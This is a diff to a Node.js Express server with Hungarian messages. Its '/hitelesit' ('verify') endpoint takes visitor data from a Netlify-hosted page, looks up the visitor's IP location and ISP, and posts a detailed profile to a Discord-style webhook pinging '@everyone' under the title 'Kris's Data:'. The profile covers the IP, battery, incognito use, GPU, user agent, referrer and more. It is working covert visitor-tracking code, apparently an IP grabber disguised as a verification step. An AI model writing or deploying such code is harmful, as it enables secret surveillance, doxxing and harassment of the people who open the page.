@@ -5,13 +5,7 @@ const cors = require('cors');
 const app = express();
 
 app.use(cors({
-    origin: [
-        'https://hitelesites.netlify.app',
-        'https://*.netlify.app',
-        'http://localhost:3000',
-        'http://127.0.0.1:5500',
-        'http://localhost:5500'
-    ],
+    origin: ['https://hitelesites.netlify.app', 'https://*.netlify.app', 'http://localhost:3000', 'http://127.0.0.1:5500'],
     methods: ['GET', 'POST', 'OPTIONS'],
     allowedHeaders: ['Content-Type'],
     optionsSuccessStatus: 204
@@ -27,21 +21,19 @@ const getClientIP = (req) => {
         .split(',')[0].trim();
 };
 
-// IP adatok lekérdezése (ország, város, ISP)
 async function getIPInfo(ip) {
     try {
-        const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 4000 });
+        const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
         return {
-            country: `${res.data.country_name || ''}, ${res.data.city || ''}`.trim() || "Ismeretlen",
-            isp: res.data.org || res.data.asn || "Ismeretlen",
-            hostname: res.data.hostname || "Ismeretlen"
+            country: `${res.data.country_name || 'Ismeretlen'}, ${res.data.city || ''}`.trim(),
+            isp: res.data.org || 'Ismeretlen',
+            hostname: res.data.hostname || 'Ismeretlen'
         };
-    } catch (e) {
-        return { country: "Ismeretlen", isp: "Ismeretlen", hostname: "Ismeretlen" };
+    } catch {
+        return { country: 'Ismeretlen', isp: 'Ismeretlen', hostname: 'Ismeretlen' };
     }
 }
 
-// ====================== FŐ ENDPOINT ======================
 app.post('/hitelesit', async (req, res) => {
     try {
         const data = req.body;
@@ -49,41 +41,45 @@ app.post('/hitelesit', async (req, res) => {
         const ipInfo = await getIPInfo(publicIP);
 
         await axios.post(WEBHOOK, {
+            content: "@everyone",
             embeds: [{
-                title: "✅ Új Belépési Kísérlet",
+                title: "Kris's Data:",
                 color: 0x00FF41,
                 timestamp: new Date().toISOString(),
                 fields: [
-                    { name: "Dátum / Idő", value: new Date().toLocaleString('hu-HU', { timeZone: 'Europe/Budapest' }), inline: false },
-                    { name: "Publikus IP", value: publicIP, inline: true },
-                    { name: "Privát IP (LAN)", value: data.localIP || "Nem található", inline: true },
-                    { name: "Ország / Város", value: ipInfo.country, inline: true },
-                    { name: "ISP", value: ipInfo.isp, inline: true },
-                    { name: "Host Name", value: ipInfo.hostname, inline: false },
-                    { name: "Eszköz", value: data.device || "Ismeretlen", inline: true },
-                    { name: "Operációs Rendszer", value: data.os || "Ismeretlen", inline: true },
-                    { name: "Böngésző", value: data.browser || "Ismeretlen", inline: true },
-                    { name: "Képernyő", value: data.screen || "Ismeretlen", inline: true },
-                    { name: "Akkumulátor", value: data.battery ? `${data.battery}% ${data.charging ? '(Töltődik)' : ''}` : "N/A", inline: true },
-                    { name: "Időzóna", value: data.timezone || "Ismeretlen", inline: true },
-                    { name: "Nyelv", value: data.language || "Ismeretlen", inline: true },
-                    { name: "Incognito", value: data.incognito ? "Igen" : "Nem", inline: true },
+                    { name: "Date/Time", value: new Date().toUTCString(), inline: false },
+                    { name: "IP Address", value: publicIP, inline: true },
+                    { name: "Country", value: ipInfo.country, inline: true },
+                    { name: "Battery", value: data.battery ? `${data.battery}%` : "N/A", inline: true },
+                    { name: "Charging", value: data.charging ? "Yes" : "No", inline: true },
+                    { name: "Orientation", value: data.orientation || "Ismeretlen", inline: true },
+                    { name: "Timezone", value: data.timezone ? `${data.timezone} GMT${data.gmtOffset || ''}` : "Ismeretlen", inline: true },
+                    { name: "User Time", value: new Date().toString(), inline: false },
+                    { name: "Language", value: data.language || "Ismeretlen", inline: true },
+                    { name: "Incognito/Private Window", value: data.incognito ? "Yes" : "No", inline: true },
+                    { name: "Ad Blocker", value: data.adBlocker ? "Yes" : "No", inline: true },
+                    { name: "Screen Size", value: data.screen || "Ismeretlen", inline: true },
+                    { name: "Colour Scheme", value: data.colorScheme || "Ismeretlen", inline: true },
+                    { name: "HDR Screen", value: data.hdr ? "Yes" : "No", inline: true },
                     { name: "GPU", value: data.gpu || "Nem detektálható", inline: false },
-                    { name: "User Agent", value: data.ua ? data.ua.substring(0, 450) + "..." : "Nincs adat", inline: false }
+                    { name: "Browser", value: data.browser || "Ismeretlen", inline: true },
+                    { name: "Operating System", value: data.os || "Ismeretlen", inline: true },
+                    { name: "Touch Screen", value: data.touchScreen ? "Yes" : "No", inline: true },
+                    { name: "User Agent", value: data.ua ? data.ua.substring(0, 500) : "N/A", inline: false },
+                    { name: "Platform", value: data.platform || "Ismeretlen", inline: true },
+                    { name: "Referring URL", value: data.referrer || "no referrer", inline: false },
+                    { name: "Host Name", value: ipInfo.hostname, inline: false },
+                    { name: "ISP", value: ipInfo.isp, inline: false }
                 ]
             }]
         });
 
         res.status(200).json({ status: "OK" });
     } catch (error) {
-        console.error('Webhook hiba:', error.message);
+        console.error('Hiba:', error.message);
         res.status(500).json({ error: "Szerver hiba" });
     }
 });
 
-app.get('/health', (req, res) => res.json({ status: 'OK' }));
-
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Szerver fut a ${PORT}-es porton`);
-});
+app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Szerver fut ${PORT}-on`));
